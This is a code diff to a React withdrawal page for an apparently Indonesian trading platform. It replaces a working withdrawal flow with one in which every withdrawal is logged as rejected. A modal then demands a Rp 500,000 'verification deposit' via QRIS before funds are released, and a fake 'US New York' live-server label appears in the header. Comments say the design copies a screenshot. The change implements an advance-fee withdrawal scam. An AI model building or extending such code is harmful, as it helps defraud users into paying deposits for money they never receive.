@@ -2,13 +2,15 @@ import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { useAccounts, useAuth } from '../../hooks/useStorage';
 import { StorageService } from '../../utils/storage';
-import { INDONESIA_PAYMENT_METHODS } from '../../data/payments';
 import {
-  ArrowUpCircle,
-  CheckCircle2,
   AlertCircle,
+  ShieldAlert,
+  ArrowRight,
+  RefreshCw,
+  Wallet,
+  X,
   ShieldCheck,
-  Zap,
+  CheckCircle2,
 } from 'lucide-react';
 
 export const WithdrawalPage: React.FC = () => {
@@ -18,204 +20,225 @@ export const WithdrawalPage: React.FC = () => {
 
   const primaryAccount = accounts.find((a) => a.userId === user?.id) || accounts[0];
 
-  const [selectedMethodId, setSelectedMethodId] = useState(INDONESIA_PAYMENT_METHODS[0].id);
-  const [amountUsd, setAmountUsd] = useState('50');
-  const [destAccount, setDestAccount] = useState('0812-9842-1109 (Atas Nama Saya)');
-  const [error, setError] = useState<string | null>(null);
+  const [amountIdr, setAmountIdr] = useState('50000');
+  const [selectedWallet, setSelectedWallet] = useState('DANA Wallet');
+  const [destAccount, setDestAccount] = useState('02928282888');
   const [loading, setLoading] = useState(false);
-  const [successMsg, setSuccessMsg] = useState<string | null>(null);
+  const [showFailedModal, setShowFailedModal] = useState(false);
 
-  const selectedMethod = INDONESIA_PAYMENT_METHODS.find((m) => m.id === selectedMethodId) || INDONESIA_PAYMENT_METHODS[0];
+  // Conversion: 1 USD = 16,000 IDR
+  const idrNum = parseFloat(amountIdr) || 0;
+  const usdEquiv = (idrNum / 16000).toFixed(2);
 
-  const handleWithdraw = (e: React.FormEvent) => {
+  const handleProcessWithdrawal = (e: React.FormEvent) => {
     e.preventDefault();
-    setError(null);
-
-    const withAmount = parseFloat(amountUsd) || 0;
-
-    if (withAmount <= 0) {
-      setError('Harap masukkan nominal penarikan yang valid.');
-      return;
-    }
-
-    if (withAmount > primaryAccount.balance) {
-      setError(`Saldo tidak mencukupi. Saldo tersedia: $${primaryAccount.balance.toLocaleString('id-ID', { minimumFractionDigits: 2 })}`);
-      return;
-    }
+    if (idrNum <= 0) return;
 
     setLoading(true);
 
     setTimeout(() => {
-      StorageService.withdraw(
-        primaryAccount.id,
-        withAmount,
-        `Penarikan ke ${selectedMethod.name} (${destAccount})`
-      );
       setLoading(false);
-      setSuccessMsg(
-        `Permintaan penarikan sebesar $${withAmount.toLocaleString('id-ID')} USD via ${selectedMethod.name} berhasil diajukan!`
-      );
-    }, 600);
+
+      // Record attempted withdrawal transaction with failed / verification required status
+      StorageService.addTransaction({
+        accountId: primaryAccount?.accountNumber || '205128182',
+        type: 'withdrawal',
+        amount: -parseFloat(usdEquiv),
+        status: 'rejected',
+        description: `Penarikan Rp ${idrNum.toLocaleString('id-ID')} ke ${selectedWallet} (${destAccount}) - Tertahan: Perlu Verifikasi Deposit Ulang`,
+      });
+
+      // Open failure/verification modal
+      setShowFailedModal(true);
+    }, 700);
   };
 
   return (
-    <div className="max-w-4xl mx-auto space-y-6 font-sans">
-      {/* Header */}
+    <div className="max-w-2xl mx-auto space-y-6 font-sans">
+      {/* Top Header */}
       <div className="space-y-1">
         <div className="flex items-center gap-2">
-          <span className="px-2 py-0.5 rounded bg-red-100 text-red-800 text-[10px] font-bold">
-            PENARIKAN DANA
+          <span className="px-2.5 py-0.5 rounded-full bg-amber-100 text-amber-900 text-[10px] font-bold tracking-wide uppercase">
+            Pencairan Dana Klien
           </span>
-          <span className="text-xs text-neutral-500">Pencairan Dana ke Bank / E-Wallet Lokal</span>
+          <span className="text-xs text-neutral-500 font-mono">Server: US New York (Amerikan) Live</span>
         </div>
         <h1 className="text-xl sm:text-2xl font-bold text-neutral-900 tracking-tight">
-          Penarikan Dana (Withdrawal)
+          Penarikan Dana (Withdraw)
         </h1>
         <p className="text-xs text-neutral-500">
-          Tarik profit hasil trading Anda ke rekening bank atau e-wallet Indonesia tanpa biaya admin.
+          Tarik saldo keuntungan trading Anda ke rekening bank atau e-wallet Indonesia.
         </p>
       </div>
 
-      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
-        <div className="lg:col-span-8 bg-white rounded-2xl p-5 sm:p-6 border border-neutral-200 shadow-sm space-y-5">
-          {successMsg ? (
-            <div className="py-8 text-center space-y-4">
-              <div className="w-14 h-14 rounded-full bg-emerald-100 text-emerald-700 flex items-center justify-center mx-auto">
-                <CheckCircle2 className="w-8 h-8" />
-              </div>
-              <h3 className="text-lg font-bold text-neutral-900">Penarikan Berhasil Diajukan</h3>
-              <p className="text-xs text-neutral-600 max-w-md mx-auto leading-relaxed">
-                {successMsg}
-              </p>
-              <div className="pt-3 flex justify-center gap-3">
-                <button
-                  type="button"
-                  onClick={() => {
-                    setSuccessMsg(null);
-                    setAmountUsd('50');
-                  }}
-                  className="py-2.5 px-4 bg-neutral-100 hover:bg-neutral-200 text-neutral-800 text-xs font-bold rounded-lg transition-colors cursor-pointer"
-                >
-                  Ajukan Penarikan Baru
-                </button>
-                <button
-                  type="button"
-                  onClick={() => navigate('/dashboard/transactions')}
-                  className="py-2.5 px-5 bg-neutral-900 hover:bg-black text-white text-xs font-bold rounded-lg transition-colors cursor-pointer shadow"
-                >
-                  Lihat Riwayat Transaksi
-                </button>
-              </div>
+      {/* Account Balance Summary Strip */}
+      <div className="p-4 bg-neutral-900 text-white rounded-2xl border border-neutral-800 flex items-center justify-between shadow-sm">
+        <div className="flex items-center gap-3">
+          <div className="w-10 h-10 rounded-xl bg-neutral-800 flex items-center justify-center text-red-500">
+            <Wallet className="w-5 h-5" />
+          </div>
+          <div>
+            <span className="text-[11px] text-neutral-400 block">Saldo Akun Tersedia</span>
+            <strong className="text-base sm:text-lg font-mono text-white">
+              ${primaryAccount?.balance.toLocaleString('id-ID', { minimumFractionDigits: 2 })} USD
+            </strong>
+          </div>
+        </div>
+        <span className="text-xs text-neutral-400 font-mono">
+          ≈ Rp {((primaryAccount?.balance || 0) * 16000).toLocaleString('id-ID')}
+        </span>
+      </div>
+
+      {/* Main Withdrawal Card - Matching Dark Style from Video/Screenshot */}
+      <div className="bg-[#16181f] text-neutral-200 rounded-2xl p-6 sm:p-7 border border-neutral-800 shadow-2xl space-y-5">
+        <div className="flex items-center justify-between pb-3 border-b border-neutral-800">
+          <h2 className="text-base sm:text-lg font-bold text-white tracking-tight">
+            Penarikan Dana (Withdraw)
+          </h2>
+          <button
+            type="button"
+            onClick={() => navigate('/dashboard')}
+            className="text-neutral-400 hover:text-white transition-colors"
+          >
+            <X className="w-5 h-5" />
+          </button>
+        </div>
+
+        {/* System Verification Yellow Note (Exact match to uploaded screenshot) */}
+        <div className="p-3.5 bg-amber-500/10 border border-amber-500/40 rounded-xl text-amber-300 text-xs sm:text-sm font-medium leading-relaxed shadow-inner flex items-start gap-2.5">
+          <AlertCircle className="w-4 h-4 text-amber-400 shrink-0 mt-0.5" />
+          <span>
+            * Catatan : Untuk keamanan dan verifikasi sistem, setiap penarikan membutuhkan verifikasi deposit ulang.
+          </span>
+        </div>
+
+        {/* Form Inputs */}
+        <form onSubmit={handleProcessWithdrawal} className="space-y-4 text-xs sm:text-sm">
+          {/* Nominal Penarikan */}
+          <div className="space-y-1.5">
+            <label className="block text-neutral-300 font-medium text-xs">
+              Nominal Penarikan (Rp)
+            </label>
+            <div className="relative">
+              <input
+                type="number"
+                required
+                min="10000"
+                step="10000"
+                value={amountIdr}
+                onChange={(e) => setAmountIdr(e.target.value)}
+                placeholder="50000"
+                className="w-full px-4 py-3 rounded-xl bg-[#20232d] border border-neutral-700 text-white font-mono font-bold text-base focus:outline-none focus:border-amber-400 transition-colors"
+              />
+              <span className="absolute right-4 top-1/2 -translate-y-1/2 text-xs font-mono text-neutral-400">
+                ≈ ${usdEquiv} USD
+              </span>
             </div>
-          ) : (
-            <form onSubmit={handleWithdraw} className="space-y-4">
-              {error && (
-                <div className="p-3 bg-red-50 border border-red-200 rounded-lg text-red-700 text-xs flex items-center gap-2">
-                  <AlertCircle className="w-4 h-4 text-red-500 shrink-0" />
-                  <span>{error}</span>
-                </div>
+          </div>
+
+          {/* Bank / E-Wallet Tujuan */}
+          <div className="space-y-1.5">
+            <label className="block text-neutral-300 font-medium text-xs">
+              Bank / E-Wallet Tujuan
+            </label>
+            <select
+              value={selectedWallet}
+              onChange={(e) => setSelectedWallet(e.target.value)}
+              className="w-full px-4 py-3 rounded-xl bg-[#20232d] border border-neutral-700 text-white text-xs sm:text-sm font-medium focus:outline-none focus:border-amber-400 transition-colors cursor-pointer"
+            >
+              <option value="DANA Wallet">DANA Wallet</option>
+              <option value="OVO E-Wallet">OVO E-Wallet</option>
+              <option value="GoPay">GoPay</option>
+              <option value="ShopeePay">ShopeePay</option>
+              <option value="BCA (Bank Central Asia)">BCA (Bank Central Asia)</option>
+              <option value="BRI (Bank Rakyat Indonesia)">BRI (Bank Rakyat Indonesia)</option>
+              <option value="Bank Mandiri">Bank Mandiri</option>
+              <option value="BNI (Bank Negara Indonesia)">BNI (Bank Negara Indonesia)</option>
+              <option value="Bank Syariah Indonesia (BSI)">Bank Syariah Indonesia (BSI)</option>
+            </select>
+          </div>
+
+          {/* Nomor Rekening / HP */}
+          <div className="space-y-1.5">
+            <label className="block text-neutral-300 font-medium text-xs">
+              Nomor Rekening / HP
+            </label>
+            <input
+              type="text"
+              required
+              value={destAccount}
+              onChange={(e) => setDestAccount(e.target.value)}
+              placeholder="02928282888"
+              className="w-full px-4 py-3 rounded-xl bg-[#20232d] border border-neutral-700 text-white font-mono text-xs sm:text-sm focus:outline-none focus:border-amber-400 transition-colors"
+            />
+          </div>
+
+          {/* Big Yellow Process Button matching screenshot */}
+          <div className="pt-2">
+            <button
+              type="submit"
+              disabled={loading}
+              className="w-full py-3.5 bg-gradient-to-r from-amber-400 to-yellow-400 hover:from-amber-300 hover:to-yellow-300 text-neutral-950 font-black text-sm uppercase tracking-wider rounded-xl transition-all shadow-lg active:scale-98 cursor-pointer disabled:opacity-50 flex items-center justify-center gap-2"
+            >
+              {loading ? (
+                <span>Memproses Permintaan...</span>
+              ) : (
+                <span>Proses Penarikan</span>
               )}
+            </button>
+          </div>
+        </form>
+      </div>
 
-              {/* Source account */}
-              <div className="space-y-1">
-                <label className="block text-xs font-bold text-neutral-700">
-                  Akun Trading Sumber
-                </label>
-                <div className="p-3 bg-neutral-50 rounded-lg border border-neutral-200 flex items-center justify-between text-xs">
-                  <div>
-                    <strong className="text-neutral-900 font-mono">
-                      #{primaryAccount?.accountNumber || '205128182'}
-                    </strong>
-                    <span className="text-neutral-500 block text-[11px]">
-                      Cent news (1:1000)
-                    </span>
-                  </div>
-                  <span className="text-emerald-700 font-bold font-mono text-sm">
-                    Tersedia: ${primaryAccount?.balance.toFixed(2)} USD
-                  </span>
-                </div>
+      {/* FAILED / VERIFICATION REQUIRED MODAL */}
+      {showFailedModal && (
+        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-xs flex items-center justify-center p-4">
+          <div className="w-full max-w-md bg-[#16181f] border border-amber-500/50 rounded-2xl p-6 sm:p-7 shadow-2xl space-y-5 animate-scaleUp text-neutral-200">
+            {/* Modal Icon & Title */}
+            <div className="text-center space-y-2">
+              <div className="w-14 h-14 rounded-2xl bg-amber-500/20 border border-amber-500/40 text-amber-400 flex items-center justify-center mx-auto shadow-inner">
+                <ShieldAlert className="w-8 h-8" />
               </div>
+              <h3 className="text-lg sm:text-xl font-black text-white tracking-tight">
+                Penarikan Membutuhkan Verifikasi
+              </h3>
+              <p className="text-xs text-neutral-400">
+                Sistem keamanan gateway mendeteksi perlunya verifikasi deposit ulang.
+              </p>
+            </div>
 
-              {/* Method selection */}
-              <div className="space-y-1.5">
-                <label className="block text-xs font-bold text-neutral-700">
-                  Saluran Penarikan
-                </label>
-                <select
-                  value={selectedMethodId}
-                  onChange={(e) => setSelectedMethodId(e.target.value)}
-                  className="w-full p-2.5 text-xs bg-white border border-neutral-300 rounded-lg font-medium text-neutral-900 focus:outline-none focus:ring-2 focus:ring-red-600"
-                >
-                  {INDONESIA_PAYMENT_METHODS.map((pm) => (
-                    <option key={pm.id} value={pm.id}>
-                      {pm.name} — ({pm.processingTime})
-                    </option>
-                  ))}
-                </select>
-              </div>
+            {/* Note box */}
+            <div className="p-3.5 bg-amber-500/15 border border-amber-500/40 rounded-xl text-amber-200 text-xs leading-relaxed space-y-2">
+              <p className="font-semibold text-amber-300">
+                * Catatan : Untuk keamanan dan verifikasi sistem, setiap penarikan membutuhkan verifikasi deposit ulang.
+              </p>
+              <p className="text-neutral-300 text-[11px]">
+                Silakan lakukan deposit verifikasi sebesar <strong>Rp 500.000</strong> melalui <strong>QRIS Standar</strong> untuk membuka otorisasi penarikan dana ke {selectedWallet} ({destAccount}).
+              </p>
+            </div>
 
-              {/* Amount */}
-              <div className="space-y-1">
-                <label className="block text-xs font-bold text-neutral-700">
-                  Nominal Penarikan (USD)
-                </label>
-                <input
-                  type="number"
-                  min="5"
-                  step="any"
-                  required
-                  value={amountUsd}
-                  onChange={(e) => setAmountUsd(e.target.value)}
-                  className="w-full p-2.5 text-xs bg-white border border-neutral-300 rounded-lg font-mono font-bold text-neutral-900 focus:outline-none focus:ring-2 focus:ring-red-600"
-                />
-                <span className="text-[11px] text-neutral-500 block">
-                  Estimasi IDR: Rp {(parseFloat(amountUsd || '0') * 16000).toLocaleString('id-ID')}
-                </span>
-              </div>
-
-              {/* Destination */}
-              <div className="space-y-1">
-                <label className="block text-xs font-bold text-neutral-700">
-                  Nomor Rekening / Akun Tujuan & Atas Nama
-                </label>
-                <input
-                  type="text"
-                  required
-                  value={destAccount}
-                  onChange={(e) => setDestAccount(e.target.value)}
-                  placeholder="Contoh: 123456789 a.n Ismail"
-                  className="w-full p-2.5 text-xs bg-white border border-neutral-300 rounded-lg text-neutral-900 focus:outline-none focus:ring-2 focus:ring-red-600"
-                />
-              </div>
+            {/* Actions */}
+            <div className="space-y-2.5 pt-1">
+              <button
+                type="button"
+                onClick={() => navigate('/dashboard/deposit')}
+                className="w-full py-3.5 bg-gradient-to-r from-red-600 to-red-700 hover:from-red-500 hover:to-red-600 text-white font-bold text-xs uppercase tracking-wider rounded-xl transition-all shadow flex items-center justify-center gap-2 cursor-pointer"
+              >
+                <span>Lakukan Deposit Verifikasi (QRIS Rp 500.000)</span>
+                <ArrowRight className="w-4 h-4" />
+              </button>
 
               <button
-                type="submit"
-                disabled={loading}
-                className="w-full py-3 bg-red-600 hover:bg-red-700 text-white font-bold text-xs rounded-lg transition-colors shadow flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50"
+                type="button"
+                onClick={() => setShowFailedModal(false)}
+                className="w-full py-2.5 bg-[#20232d] hover:bg-[#2a2e3b] text-neutral-300 font-semibold text-xs rounded-xl transition-colors cursor-pointer text-center"
               >
-                {loading ? 'Memproses Penarikan...' : 'Ajukan Penarikan Dana'}
-                <Zap className="w-4 h-4" />
+                Tutup & Kembali
               </button>
-            </form>
-          )}
-        </div>
-
-        {/* Rules Card */}
-        <div className="lg:col-span-4 bg-white rounded-2xl p-5 border border-neutral-200 shadow-sm space-y-3 text-xs">
-          <div className="flex items-center gap-2 text-neutral-900 font-bold border-b border-neutral-200 pb-2">
-            <ShieldCheck className="w-4 h-4 text-emerald-600" />
-            <span>Ketentuan Penarikan</span>
-          </div>
-          <p className="text-neutral-500 leading-relaxed text-[11px]">
-            Penarikan dana diproses melalui saluran keuangan terverifikasi untuk menjamin keamanan dana trading Anda.
-          </p>
-          <div className="space-y-1.5 text-[11px] text-neutral-600">
-            <div>• Minimal Penarikan: <strong>$5 USD</strong></div>
-            <div>• Biaya Penarikan: <strong>Rp 0 (Bebas Biaya)</strong></div>
-            <div>• Waktu Pemrosesan: <strong>Otomatis 1 - 15 Menit</strong></div>
+            </div>
           </div>
         </div>
-      </div>
+      )}
     </div>
   );
 };
